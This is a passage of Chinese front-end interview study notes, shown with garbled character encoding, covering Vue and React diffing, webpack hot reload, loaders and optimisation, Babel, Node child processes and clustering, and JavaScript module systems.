- vueçš„åˆ—è¡¨æ¯”å¯¹é‡‡ç”¨çš„æ˜¯é¦–å°¾æŒ‡é’ˆæ³•ï¼Œè€Œreacté‡‡ç”¨çš„æ˜¯ä»å·¦åˆ°å³ä¾æ¬¡æ¯”å¯¹çš„æ–¹å¼ï¼Œå½“ä¸€ä¸ªé›†åˆåªæ˜¯æŠŠæœ€åä¸€ä¸ªèŠ‚ç‚¹ç§»åŠ¨åˆ°äº†ç¬¬ä¸€ä¸ªï¼Œreactä¼šæŠŠå‰é¢çš„èŠ‚ç‚¹ä¾æ¬¡ç§»åŠ¨ï¼Œè€Œvueåªä¼šæŠŠæœ€åä¸€ä¸ªèŠ‚ç‚¹ç§»åŠ¨åˆ°æœ€åä¸€ä¸ªï¼Œä»è¿™ç‚¹ä¸Šæ¥è¯´vueçš„å¯¹æ¯”æ–¹å¼æ›´åŠ é«˜æ•ˆã€‚

#### ç±»ä¼¼çš„ç‚¹

- åªæ¯”è¾ƒåŒä¸€å±‚çº§ï¼Œä¸è·¨çº§æ¯”è¾ƒ
- tag ä¸åŒåˆ™åˆ é™¤é‡å»º
- å­èŠ‚ç‚¹é€šè¿‡ key åŒºåˆ†

#### ä¸åŒç‚¹

**React diff ä»…å³ç§»**

![](https://raw.githubusercontent.com/zhang874010534/tuchuan/main/interview/react-diff.png)

é‡‡å–çš„ç­–ç•¥æ˜¯ b c ä¸åŠ¨å³ç§» a

**vue2 diff**

![](https://raw.githubusercontent.com/zhang874010534/tuchuan/main/interview/vue2diff.png)

**vue3 diff**

![](https://raw.githubusercontent.com/zhang874010534/tuchuan/bded36c5b0d182d936ceb58fb2c258989bd469e5/interview/vue3-diff.png)

### ç»„ä»¶é€šä¿¡æ–¹æ³•ä¸åŒ

## Webpack

### çƒ­æ›´æ–°

é€šè¿‡webpack-dev-serveråˆ›å»ºä¸¤ä¸ªæœåŠ¡å™¨ï¼šæä¾›é™æ€èµ„æºçš„æœåŠ¡ï¼ˆexpressï¼‰å’ŒSocketæœåŠ¡ 

express server è´Ÿè´£ç›´æ¥æä¾›é™æ€èµ„æºçš„æœåŠ¡ï¼ˆæ‰“åŒ…åçš„èµ„æºç›´æ¥è¢«æµè§ˆå™¨è¯·æ±‚å’Œè§£æï¼‰ 

socket server æ˜¯ä¸€ä¸ª websocket çš„é•¿è¿æ¥ï¼ŒåŒæ–¹å¯ä»¥é€šä¿¡ 

å½“ socket server ç›‘å¬åˆ°å¯¹åº”çš„æ¨¡å—å‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¼šç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶.jsonï¼ˆmanifestæ–‡ä»¶ï¼‰å’Œ.jsæ–‡ä»¶ï¼ˆupdate chunkï¼‰ 

é€šè¿‡é•¿è¿æ¥ï¼Œsocket server å¯ä»¥ç›´æ¥å°†è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸»åŠ¨å‘é€ç»™å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰ æµè§ˆå™¨æ‹¿åˆ°ä¸¤ä¸ªæ–°çš„æ–‡ä»¶åï¼Œé€šè¿‡HMR runtimeæœºåˆ¶ï¼ŒåŠ è½½è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”é’ˆå¯¹ä¿®æ”¹çš„æ¨¡å—è¿›è¡Œæ›´æ–°

### webpackä¸­å¸¸è§çš„Loader

#### css-loader

> å¸®æˆ‘ä»¬åˆ†æå‡ºå„ä¸ªcssæ–‡ä»¶ä¹‹é—´çš„å…³ç³»ï¼ŒæŠŠå„ä¸ªcssæ–‡ä»¶åˆå¹¶æˆä¸€æ®µcss

#### style-loader

>  å°†cssæ·»åŠ åˆ°DOMçš„å†…è”æ ·å¼æ ‡ç­¾styleé‡Œ

#### less-loader

#### sass-loader

#### postcss-loader

ç”¨postcssæ¥å¤„ç†CSS 

#### file-loader

åˆ†å‘æ–‡ä»¶åˆ°outputç›®å½•å¹¶è¿”å›ç›¸å¯¹è·¯å¾„ 

#### url-loader

> å’Œfile-loaderç±»ä¼¼ï¼Œä½†æ˜¯å½“æ–‡ä»¶å°äºè®¾å®šçš„limitæ—¶å¯ä»¥è¿”å›ä¸€ä¸ªData Url 

#### html-minify-loader

> å‹ç¼©HTML 

#### babel-loader

> ç”¨babelæ¥è½¬æ¢ES6æ–‡ä»¶åˆ°ES5

### ä¼˜åŒ–

#### æ‰“åŒ…é€Ÿåº¦

##### HappyPack

å—é™äº Node æ˜¯å•çº¿ç¨‹è¿è¡Œçš„ï¼Œæ‰€ä»¥ Webpack åœ¨æ‰“åŒ…çš„è¿‡ç¨‹ä¸­ä¹Ÿæ˜¯å•çº¿ç¨‹çš„ï¼Œç‰¹åˆ«æ˜¯åœ¨æ‰§è¡Œ Loader çš„æ—¶å€™ï¼Œé•¿æ—¶é—´ç¼–è¯‘çš„ä»»åŠ¡å¾ˆå¤šï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ç­‰å¾…çš„æƒ…å†µã€‚

**HappyPack å¯ä»¥å°† Loader çš„åŒæ­¥æ‰§è¡Œè½¬æ¢ä¸ºå¹¶è¡Œçš„**ï¼Œè¿™æ ·å°±èƒ½å……åˆ†åˆ©ç”¨ç³»ç»Ÿèµ„æºæ¥åŠ å¿«æ‰“åŒ…æ•ˆç‡äº†

##### DllPlugin

**DllPlugin å¯ä»¥å°†ç‰¹å®šçš„ç±»åº“æå‰æ‰“åŒ…ç„¶åå¼•å…¥**ã€‚è¿™ç§æ–¹å¼å¯ä»¥æå¤§çš„å‡å°‘æ‰“åŒ…ç±»åº“çš„æ¬¡æ•°ï¼Œåªæœ‰å½“ç±»åº“æ›´æ–°ç‰ˆæœ¬æ‰æœ‰éœ€è¦é‡æ–°æ‰“åŒ…ï¼Œå¹¶ä¸”ä¹Ÿå®ç°äº†å°†å…¬å…±ä»£ç æŠ½ç¦»æˆå•ç‹¬æ–‡ä»¶çš„ä¼˜åŒ–æ–¹æ¡ˆã€‚

##### ä»£ç å‹ç¼©

åœ¨ Webpack3 ä¸­ï¼Œä¸€èˆ¬ä½¿ç”¨ `UglifyJS` æ¥å‹ç¼©ä»£ç ï¼Œä½†æ˜¯è¿™ä¸ªæ˜¯å•çº¿ç¨‹è¿è¡Œçš„ï¼Œä¸ºäº†åŠ å¿«æ•ˆç‡ï¼Œå¯ä»¥ä½¿ç”¨ `webpack-parallel-uglify-plugin` æ¥å¹¶è¡Œè¿è¡Œ `UglifyJS`ï¼Œä»è€Œæé«˜æ•ˆç‡ã€‚

åœ¨ Webpack4 ä¸­ï¼Œä¸éœ€è¦ä»¥ä¸Šè¿™äº›æ“ä½œäº†ï¼Œåªéœ€è¦**å°† `mode` è®¾ç½®ä¸º `production`** å°±å¯ä»¥é»˜è®¤å¼€å¯ä»¥ä¸ŠåŠŸèƒ½ã€‚ä»£ç å‹ç¼©ä¹Ÿæ˜¯æˆ‘ä»¬å¿…åšçš„æ€§èƒ½ä¼˜åŒ–æ–¹æ¡ˆï¼Œå½“ç„¶æˆ‘ä»¬ä¸æ­¢å¯ä»¥å‹ç¼© JS ä»£ç ï¼Œè¿˜å¯ä»¥å‹ç¼© HTMLã€CSS ä»£ç ï¼Œå¹¶ä¸”åœ¨å‹ç¼© JS ä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡é…ç½®å®ç°æ¯”å¦‚åˆ é™¤ `console.log` è¿™ç±»ä»£ç çš„åŠŸèƒ½ã€‚

å‹ç¼©åçš„ä»£ç ä½“ç§¯æ›´å°ï¼Œæ‰“åŒ…è¿‡ç¨‹éœ€è¦å¤„ç†çš„æ–‡ä»¶æ›´å°‘ï¼Œä»è€ŒåŠ å¿«äº†æ‰“åŒ…é€Ÿåº¦ã€‚ä½†æ˜¯ï¼Œå‹ç¼©çš„è¿‡ç¨‹éœ€è¦æ¶ˆè€—ä¸€å®šçš„æ—¶é—´å’Œè®¡ç®—èµ„æºï¼Œå› æ­¤è¿™ä¸ªä¼˜åŒ–å¹¶ä¸ä¼šå¸¦æ¥éå¸¸æ˜¾è‘—çš„æ€§èƒ½æå‡ã€‚

#### å‡å°‘ Webpack æ‰“åŒ…ä½“ç§¯ ä¼˜åŒ–æ€§èƒ½

##### æŒ‰éœ€åŠ è½½

åœ¨å¼€å‘ SPA é¡¹ç›®çš„æ—¶å€™ï¼Œé¡¹ç›®ä¸­éƒ½ä¼šå­˜åœ¨å¾ˆå¤šè·¯ç”±é¡µé¢ã€‚å¦‚æœå°†è¿™äº›é¡µé¢å…¨éƒ¨æ‰“åŒ…è¿›ä¸€ä¸ª JS æ–‡ä»¶çš„è¯ï¼Œè™½ç„¶å°†å¤šä¸ªè¯·æ±‚åˆå¹¶äº†ï¼Œä½†æ˜¯åŒæ ·ä¹ŸåŠ è½½äº†å¾ˆå¤šå¹¶ä¸éœ€è¦çš„ä»£ç ï¼Œè€—è´¹äº†æ›´é•¿çš„æ—¶é—´ã€‚é‚£ä¹ˆä¸ºäº†é¦–é¡µèƒ½æ›´å¿«åœ°å‘ˆç°ç»™ç”¨æˆ·ï¼Œå¸Œæœ›é¦–é¡µèƒ½åŠ è½½çš„æ–‡ä»¶ä½“ç§¯è¶Šå°è¶Šå¥½ï¼Œ**è¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨æŒ‰éœ€åŠ è½½ï¼Œå°†æ¯ä¸ªè·¯ç”±é¡µé¢å•ç‹¬æ‰“åŒ…ä¸ºä¸€ä¸ªæ–‡ä»¶**ã€‚å½“ç„¶ä¸ä»…ä»…è·¯ç”±å¯ä»¥æŒ‰éœ€åŠ è½½ï¼Œå¯¹äº `loadash` è¿™ç§å¤§å‹ç±»åº“åŒæ ·å¯ä»¥ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½ã€‚

##### Scope Hoisting

Scope Hoisting ä¼šåˆ†æå‡ºæ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œå°½å¯èƒ½çš„æŠŠæ‰“åŒ…å‡ºæ¥çš„æ¨¡å—åˆå¹¶åˆ°ä¸€ä¸ªå‡½æ•°ä¸­å»ã€‚

##### tree Shaking

**Tree Shaking å¯ä»¥å®ç°åˆ é™¤é¡¹ç›®ä¸­æœªè¢«å¼•ç”¨çš„ä»£ç **ã€‚å¯ä»¥é€šè¿‡åœ¨å¯åŠ¨webpackæ—¶è¿½åŠ å‚æ•° --optimize-minimize æ¥å®ç°

##### åˆ©â½¤CDNåŠ é€Ÿå’Œexternals é…ç½®æ¥æå–å¸¸â½¤åº“

#### é•¿ç¼“å­˜

##### [æå–å…¬å…±ç¬¬ä¸‰æ–¹åº“](https://juejin.cn/post/6844903680307625997#heading-13)

SplitChunksPluginæ’ä»¶æ¥è¿›â¾å…¬å…±æ¨¡å—æŠ½å–,åˆ©â½¤æµè§ˆå™¨ç¼“å­˜å¯ä»¥â»“æœŸç¼“å­˜è¿™äº›â½†éœ€é¢‘ç¹å˜åŠ¨çš„å…¬å…±ä»£ç 

é»˜è®¤çš„splitChunkè®¾ç½®åªä¼šå½±å“æŒ‰éœ€åŠ è½½æ¨¡å—ï¼Œæ¯”å¦‚React.lazyå¤„ç†è¿‡çš„ç»„ä»¶

##### ä½¿ç”¨æ–‡ä»¶åå“ˆå¸Œ

åœ¨ Webpack é…ç½®ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ `[hash]` æˆ– `[contenthash]` å ä½ç¬¦æ¥ä¸ºè¾“å‡ºæ–‡ä»¶æ·»åŠ å“ˆå¸Œå€¼ã€‚è¿™æ ·å¯ä»¥ç¡®ä¿æ¯ä¸ªæ–‡ä»¶çš„å“ˆå¸Œå€¼éƒ½æ˜¯å”¯ä¸€çš„ï¼Œå¦‚æœæ–‡ä»¶å†…å®¹æ²¡æœ‰æ›´æ”¹ï¼Œåˆ™å“ˆå¸Œå€¼ä¹Ÿä¸ä¼šæ›´æ”¹ã€‚å› æ­¤ï¼Œæµè§ˆå™¨å¯ä»¥ä½¿ç”¨ä¹‹å‰ç¼“å­˜çš„æ–‡ä»¶ã€‚

### BabelåŸç†

Babel æ˜¯ä¸€ä¸ª JavaScript ç¼–è¯‘å™¨ï¼Œä¸»è¦ç”¨äºå°† ES6+ ä»£ç è½¬æ¢ä¸ºå‘åå…¼å®¹çš„ JavaScript ä»£ç ï¼Œä»¥ä¾¿åœ¨å½“å‰å’Œæ—§ç‰ˆæµè§ˆå™¨ä¸­è¿è¡Œã€‚Babel çš„ç¼–è¯‘è¿‡ç¨‹åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š

1. è§£æï¼ˆParsingï¼‰ï¼šBabel å°†æºä»£ç è§£ææˆæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ï¼ŒAST æ˜¯æºä»£ç çš„ä¸­é—´è¡¨ç¤ºï¼Œå®ƒå¯ä»¥æ–¹ä¾¿åœ°è¿›è¡Œåˆ†æå’Œè½¬æ¢ã€‚
2. è½¬æ¢ï¼ˆTransformationï¼‰ï¼šBabel å¯¹ AST è¿›è¡Œéå†å’Œä¿®æ”¹ï¼Œå°†æºä»£ç ä¸­çš„ ES6+ è¯­æ³•è½¬æ¢ä¸º ES5 è¯­æ³•ï¼Œä¾‹å¦‚å°†ç®­å¤´å‡½æ•°è½¬æ¢ä¸ºæ™®é€šå‡½æ•°ã€å°†æ¨¡æ¿å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ‹¼æ¥ç­‰ã€‚Babel æä¾›äº†ä¸€ç³»åˆ—æ’ä»¶ï¼Œå¯ä»¥é€šè¿‡é…ç½®ä¸åŒçš„æ’ä»¶æ¥å®ç°ä¸åŒçš„è½¬æ¢ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰æ’ä»¶æ¥å®ç°ç‰¹å®šçš„è½¬æ¢ã€‚
3. ç”Ÿæˆï¼ˆCode Generationï¼‰ï¼šBabel å°†è½¬æ¢åçš„ AST é‡æ–°ç”Ÿæˆ JavaScript ä»£ç ï¼Œä»¥ä¾¿åœ¨æµè§ˆå™¨ä¸­è¿è¡Œã€‚Babel å¯ä»¥å°† AST è½¬æ¢ä¸ºä¸åŒçš„ç›®æ ‡ä»£ç ï¼Œä¾‹å¦‚å°† AST è½¬æ¢ä¸ºæµè§ˆå™¨å¯ä»¥ç›´æ¥æ‰§è¡Œçš„ JavaScript ä»£ç ã€å°† AST è½¬æ¢ä¸º UMD æ¨¡å—ç­‰ã€‚

å°±åƒæ˜¯ä¸€å¼€å§‹ä»£ç æ˜¯æ—¥è¯­ï¼Œè½¬æˆäº†è‹±è¯­ï¼ˆASTï¼‰ï¼Œåˆå¯¹è‹±è¯­è¿›è¡Œäº†ä¿®æ”¹ï¼Œå†è½¬åŒ–æˆäº†ä¸­æ–‡

## Node

### nodeå¦‚ä½•å¼€å¯å¤šçº¿ç¨‹

#### child_process.fork

> æ¯”å¦‚å¼€å¯å•ä¸ªè®¡ç®—ï¼Œå°±å¯ä»¥å¼€å¯ä¸€ä¸ªå­è¿›ç¨‹å»ç®—

index.js

```js
const fork = require('child_process').fork
const http = require('http')
const server = http.createServer((req, res  ) => {
  console.log(req.url)
  if(req.url === '/demo') {
    const computeProcess = fork('./compute.js')
    computeProcess.send('å¼€å§‹')

    computeProcess.on('message', (data) => {
      console.log(data,'ä¸»')
      res.end('sum' + data)
    })

    computeProcess.on('close', () => {
      console.log('å…³é—­äº†è¿›ç¨‹')
      computeProcess.kill()
      res.end('ee')
    })
  }
})
server.listen(3000, () => {
  console.log('3000')
})
console.log(process.pid)
```

compute.js

```js
function getSum() {
  let sum = 0
  for (let i = 0; i < 1000000; i++) {
    sum ++
  }
  return sum
}

process.on('message', (data ) => {
  console.log(data,'å­')
  const sum = getSum()
  process.send(sum)
})
```

#### cluster.fork

> å¼€å¯å¤šä¸ªå­è¿›ç¨‹ï¼Œå¤šä¸ªæœåŠ¡çš„åœºæ™¯

```js
const http = require('http')
const cpuCoreLength = require('os').cpus().length
const cluster = require('cluster')
// import cluster from 'cluster'
if (cluster.isMaster) {
  for (let i = 0; i < cpuCoreLength; i++) {
    cluster.fork() // å¼€å¯å­è¿›ç¨‹
  }
  cluster.on('exit', (worker) => {
    console.log('å­è¿›ç¨‹é€€å‡º')
    cluster.fork() // è¿›ç¨‹å®ˆæŠ¤
  })
}else {
  // å¤šä¸ªå­è¿›ç¨‹ä¼šå…±äº«ä¸€ä¸ª TCP è¿æ¥ï¼Œæä¾›ä¸€ä»½ç½‘ç»œæœåŠ¡
  const server = http.createServer((req, res) => {
    res.writeHead(200)
    res.end('done')
  })
  server.listen(3000)
}
```



# AMDã€CMDã€CommonJSã€ES6 Module

### AMD

AMD æ–¹æ¡ˆï¼Œè¿™ç§æ–¹æ¡ˆé‡‡ç”¨å¼‚æ­¥åŠ è½½çš„æ–¹å¼æ¥åŠ è½½æ¨¡å—ï¼Œæ¨¡å—çš„åŠ è½½ä¸å½±å“åé¢è¯­å¥çš„æ‰§è¡Œï¼Œæ‰€æœ‰ä¾èµ–è¿™ä¸ªæ¨¡å—çš„è¯­å¥éƒ½å®šä¹‰åœ¨ä¸€ä¸ªå›è°ƒå‡½æ•°é‡Œï¼Œç­‰åˆ°åŠ è½½å®Œæˆåå†æ‰§è¡Œå›è°ƒå‡½æ•°ã€‚require.js å®ç°äº† AMD è§„èŒƒã€‚æ¨å´‡**ä¾èµ–å‰ç½®ï¼Œæå‰æ‰§è¡Œ**ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨`define`æ–¹æ³•é‡Œä¼ å…¥çš„ä¾èµ–æ¨¡å—(æ•°ç»„)ï¼Œä¼šåœ¨ä¸€å¼€å§‹å°±ä¸‹è½½å¹¶æ‰§è¡Œã€‚

RequireJSçš„åŸºæœ¬ç”¨æ³•

```js
//a.js
//defineå¯ä»¥ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯å­—ç¬¦ä¸²-æ¨¡å—åã€æ•°ç»„-ä¾èµ–æ¨¡å—ã€å‡½æ•°-å›è°ƒå‡½æ•°
define(function(){
    return 1;
})

// b.js
//æ•°ç»„ä¸­å£°æ˜éœ€è¦åŠ è½½çš„æ¨¡å—ï¼Œå¯ä»¥æ˜¯æ¨¡å—åã€jsæ–‡ä»¶è·¯å¾„
require(['a'], function(a){
    console.log(a);// 1
});
```

### CMD

CMD æ–¹æ¡ˆï¼Œè¿™ç§æ–¹æ¡ˆå’Œ AMD æ–¹æ¡ˆéƒ½æ˜¯ä¸ºäº†è§£å†³å¼‚æ­¥æ¨¡å—åŠ è½½çš„é—®é¢˜ï¼Œsea.js å®ç°äº† CMD è§„èŒƒã€‚å®ƒå’Œ require.js çš„åŒºåˆ«åœ¨äºæ¨¡å—å®šä¹‰æ—¶å¯¹ä¾èµ–çš„å¤„ç†ä¸åŒå’Œå¯¹ä¾èµ–æ¨¡å—çš„æ‰§è¡Œæ—¶æœºçš„å¤„ç†ä¸åŒã€‚å¯¹äºä¾èµ–çš„æ¨¡å—ï¼ŒCMDæ¨å´‡**ä¾èµ–å°±è¿‘ï¼Œå»¶è¿Ÿæ‰§è¡Œ**ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåªæœ‰åˆ°`require`æ—¶ä¾èµ–æ¨¡å—æ‰æ‰§è¡Œã€‚

SeaJSçš„åŸºæœ¬ç”¨æ³•

```js
//a.js
/*
* define æ¥å— factory å‚æ•°ï¼Œfactory å¯ä»¥æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå¯¹è±¡æˆ–å­—ç¬¦ä¸²ï¼Œ
* factory ä¸ºå¯¹è±¡ã€å­—ç¬¦ä¸²æ—¶ï¼Œè¡¨ç¤ºæ¨¡å—çš„æ¥å£å°±æ˜¯è¯¥å¯¹è±¡ã€å­—ç¬¦ä¸²ã€‚
* define ä¹Ÿå¯ä»¥æ¥å—ä¸¤ä¸ªä»¥ä¸Šå‚æ•°ã€‚å­—ç¬¦ä¸² id è¡¨ç¤ºæ¨¡å—æ ‡è¯†ï¼Œæ•°ç»„ deps æ˜¯æ¨¡å—ä¾èµ–.
*/
define(function(require, exports, module) {
  var $ = require('jquery');

  exports.setColor = function() {
    $('body').css('color','#333');
  };
});

//b.js
//æ•°ç»„ä¸­å£°æ˜éœ€è¦åŠ è½½çš„æ¨¡å—ï¼Œå¯ä»¥æ˜¯æ¨¡å—åã€jsæ–‡ä»¶è·¯å¾„
seajs.use(['a'], function(a) {
  $('#el').click(a.setColor);
});
```

### AMD å’Œ CMD è§„èŒƒçš„åŒºåˆ«ï¼Ÿ

1. ç¬¬ä¸€ä¸ªæ–¹é¢æ˜¯åœ¨æ¨¡å—å®šä¹‰æ—¶å¯¹ä¾èµ–çš„å¤„ç†ä¸åŒã€‚AMD æ¨å´‡ä¾èµ–å‰ç½®ï¼Œåœ¨å®šä¹‰æ¨¡å—çš„æ—¶å€™å°±è¦å£°æ˜å…¶ä¾èµ–çš„æ¨¡å—ã€‚è€Œ CMD æ¨å´‡å°±è¿‘ä¾èµ–ï¼Œåªæœ‰åœ¨ç”¨åˆ°æŸä¸ªæ¨¡å—çš„æ—¶å€™å†å» requireã€‚ 
2. æ–¹é¢æ˜¯å¯¹ä¾èµ–æ¨¡å—çš„æ‰§è¡Œæ—¶æœºå¤„ç†ä¸åŒã€‚é¦–å…ˆ AMD å’Œ CMD å¯¹äºæ¨¡å—çš„åŠ è½½æ–¹å¼éƒ½æ˜¯å¼‚æ­¥åŠ è½½ï¼Œä¸è¿‡å®ƒä»¬çš„åŒºåˆ«åœ¨äº æ¨¡å—çš„æ‰§è¡Œæ—¶æœºï¼ŒAMD åœ¨ä¾èµ–æ¨¡å—åŠ è½½å®Œæˆåå°±ç›´æ¥æ‰§è¡Œä¾èµ–æ¨¡å—ï¼Œä¾èµ–æ¨¡å—çš„æ‰§è¡Œé¡ºåºå’Œæˆ‘ä»¬ä¹¦å†™çš„é¡ºåºä¸ä¸€å®šä¸€è‡´ã€‚è€Œ CMD åœ¨ä¾èµ–æ¨¡å—åŠ è½½å®Œæˆåå¹¶ä¸æ‰§è¡Œï¼Œåªæ˜¯ä¸‹è½½è€Œå·²ï¼Œç­‰åˆ°æ‰€æœ‰çš„ä¾èµ–æ¨¡å—éƒ½åŠ è½½å¥½åï¼Œ**è¿›å…¥å›è°ƒå‡½æ•°é€»è¾‘**ï¼Œé‡åˆ° require è¯­å¥ çš„æ—¶å€™æ‰æ‰§è¡Œå¯¹åº”çš„æ¨¡å—ï¼Œè¿™æ ·æ¨¡å—çš„æ‰§è¡Œé¡ºåºå°±å’Œæˆ‘ä»¬ä¹¦å†™çš„é¡ºåºä¿æŒä¸€è‡´äº†ã€‚

```js
// CMD
define(function(require, exports, module) {
  var a = require("./a");
  a.doSomething();
  // æ­¤å¤„ç•¥å» 100 è¡Œ
  var b = require("./b"); // ä¾èµ–å¯ä»¥å°±è¿‘ä¹¦å†™
  b.doSomething();
  // ...
});

// AMD é»˜è®¤æ¨è
define(["./a", "./b"], function(a, b) {
  // ä¾èµ–å¿…é¡»ä¸€å¼€å§‹å°±å†™å¥½
  a.doSomething();
  // æ­¤å¤„ç•¥å» 100 è¡Œ
  b.doSomething();
  // ...
});
```

### CommonJs

CommonJS æ–¹æ¡ˆï¼Œå®ƒé€šè¿‡ require æ¥å¼•å…¥æ¨¡å—ï¼Œé€šè¿‡ module.exports å®šä¹‰æ¨¡å—çš„è¾“å‡ºæ¥å£ã€‚è¿™ç§æ¨¡å—åŠ è½½æ–¹æ¡ˆæ˜¯æœåŠ¡å™¨ç«¯çš„è§£å†³æ–¹æ¡ˆï¼Œå®ƒæ˜¯ä»¥åŒæ­¥çš„æ–¹å¼æ¥å¼•å…¥æ¨¡å—çš„ï¼Œå› ä¸ºåœ¨æœåŠ¡ç«¯æ–‡ä»¶éƒ½å­˜å‚¨åœ¨æœ¬åœ°ç£ç›˜ï¼Œæ‰€ä»¥è¯»å–éå¸¸å¿«ï¼Œæ‰€ä»¥ä»¥åŒæ­¥çš„æ–¹å¼åŠ è½½æ²¡æœ‰é—®é¢˜ã€‚ä½†å¦‚æœæ˜¯åœ¨æµè§ˆå™¨ç«¯ï¼Œç”±äºæ¨¡å—çš„åŠ è½½æ˜¯ä½¿ç”¨ç½‘ç»œè¯·æ±‚ï¼Œå› æ­¤ä½¿ç”¨å¼‚æ­¥åŠ è½½çš„æ–¹å¼æ›´åŠ åˆé€‚ã€‚

CommonJSçš„åŸºæœ¬ç”¨æ³•

```js
//a.js
module.exports = function () {
  console.log("hello world")
}

//b.js
var a = require('./a');

a();//"hello world"

//æˆ–è€…

//a2.js
exports.num = 1;
exports.obj = {xx: 2};

//b2.js
var a2 = require('./a2');

console.log(a2);//{ num: 1, obj: { xx: 2 } }
```

### ES6 Module

ES6 æå‡ºçš„æ–¹æ¡ˆï¼Œä½¿ç”¨ import å’Œ export çš„å½¢å¼æ¥å¯¼å…¥å¯¼å‡ºæ¨¡å—ã€‚

### ES6 Moduleçš„ç‰¹ç‚¹(å¯¹æ¯”CommonJS)

#### è¯­æ³•ä¸Š

CommonJS ä½¿ç”¨çš„æ˜¯ module.exports = {} å¯¼å‡ºä¸€ä¸ªæ¨¡å—å¯¹è±¡ï¼Œrequire(â€˜file_pathâ€™) å¼•å…¥æ¨¡å—å¯¹è±¡ï¼› ES6ä½¿ç”¨çš„æ˜¯ export å¯¼å‡ºæŒ‡å®šæ•°æ®ï¼Œ import å¼•å…¥å…·ä½“æ•°æ®ã€‚

#### CommonJS æ¨¡å—è¾“å‡ºçš„æ˜¯ä¸€ä¸ªå€¼çš„æ‹·è´ï¼ŒES6 æ¨¡å—è¾“å‡ºçš„æ˜¯å€¼çš„å¼•ç”¨

CommonJS æ¨¡å—è¾“å‡ºçš„æ˜¯å€¼çš„æ‹·è´ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦è¾“å‡ºä¸€ä¸ªå€¼ï¼Œæ¨¡å—å†…éƒ¨çš„å˜åŒ–å°±å½±å“ä¸åˆ°è¿™ä¸ªå€¼ã€‚  ES6 Modules çš„è¿è¡Œæœºåˆ¶ä¸ CommonJS ä¸ä¸€æ ·ã€‚JS å¼•æ“å¯¹è„šæœ¬é™æ€åˆ†æçš„æ—¶å€™ï¼Œé‡åˆ°æ¨¡å—åŠ è½½å‘½ä»¤importï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªåªè¯»å¼•ç”¨ã€‚ç­‰åˆ°è„šæœ¬çœŸæ­£æ‰§è¡Œæ—¶ï¼Œå†æ ¹æ®è¿™ä¸ªåªè¯»å¼•ç”¨ï¼Œåˆ°è¢«åŠ è½½çš„é‚£ä¸ªæ¨¡å—é‡Œé¢å»å–å€¼ã€‚æ¢å¥è¯è¯´ï¼ŒES6çš„import æœ‰ç‚¹åƒ Unix ç³»ç»Ÿçš„â€œç¬¦å·è¿æ¥â€ï¼ŒåŸå§‹å€¼å˜äº†ï¼ŒimportåŠ è½½çš„å€¼ä¹Ÿä¼šè·Ÿç€å˜ã€‚å› æ­¤ï¼ŒES6æ¨¡å—æ˜¯åŠ¨æ€å¼•ç”¨ï¼Œå¹¶ä¸”ä¸ä¼šç¼“å­˜å€¼ï¼Œæ¨¡å—é‡Œé¢çš„å˜é‡ç»‘å®šå…¶æ‰€åœ¨çš„æ¨¡å—ã€‚

#### CommonJS æ¨¡å—æ˜¯è¿è¡Œæ—¶åŠ è½½ï¼ŒES6 æ¨¡å—æ˜¯ç¼–è¯‘æ—¶åŠ è½½

è¿è¡Œæ—¶åŠ è½½: CommonJS æ¨¡å—å°±æ˜¯å¯¹è±¡ï¼›å³åœ¨è¾“å…¥æ—¶æ˜¯å…ˆåŠ è½½æ•´ä¸ªæ¨¡å—ï¼Œç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå†ä»è¿™ä¸ªå¯¹è±¡ä¸Šé¢è¯»å–æ–¹æ³•ï¼Œè¿™ç§åŠ è½½ç§°ä¸ºâ€œè¿è¡Œæ—¶åŠ è½½â€ã€‚  

ç¼–è¯‘æ—¶åŠ è½½: ES6 æ¨¡å—ä¸æ˜¯å¯¹è±¡ï¼Œè€Œæ˜¯é€šè¿‡ export å‘½ä»¤æ˜¾å¼æŒ‡å®šè¾“å‡ºçš„ä»£ç ï¼Œimportæ—¶é‡‡ç”¨é™æ€å‘½ä»¤çš„å½¢å¼ã€‚å³åœ¨importæ—¶å¯ä»¥æŒ‡å®šåŠ è½½æŸä¸ªè¾“å‡ºå€¼ï¼Œè€Œä¸æ˜¯åŠ è½½æ•´ä¸ªæ¨¡å—ï¼Œè¿™ç§åŠ è½½ç§°ä¸ºâ€œç¼–è¯‘æ—¶åŠ è½½â€  

CommonJS åŠ è½½çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ˆå³module.exportså±æ€§ï¼‰ï¼Œè¯¥å¯¹è±¡åªæœ‰åœ¨è„šæœ¬è¿è¡Œå®Œæ‰ä¼šç”Ÿæˆã€‚è€Œ ES6 æ¨¡å—ä¸æ˜¯å¯¹è±¡ï¼Œå®ƒçš„å¯¹å¤–æ¥å£åªæ˜¯ä¸€ç§é™æ€å®šä¹‰ï¼Œåœ¨ä»£ç é™æ€è§£æé˜¶æ®µå°±ä¼šç”Ÿæˆ

# è®¡ç®—æœºç½‘ç»œ

## TCP ä¸‰æ¬¡æ¡æ‰‹å’Œå››æ¬¡æŒ¥æ‰‹

å»ºç«‹ TCP è¿æ¥

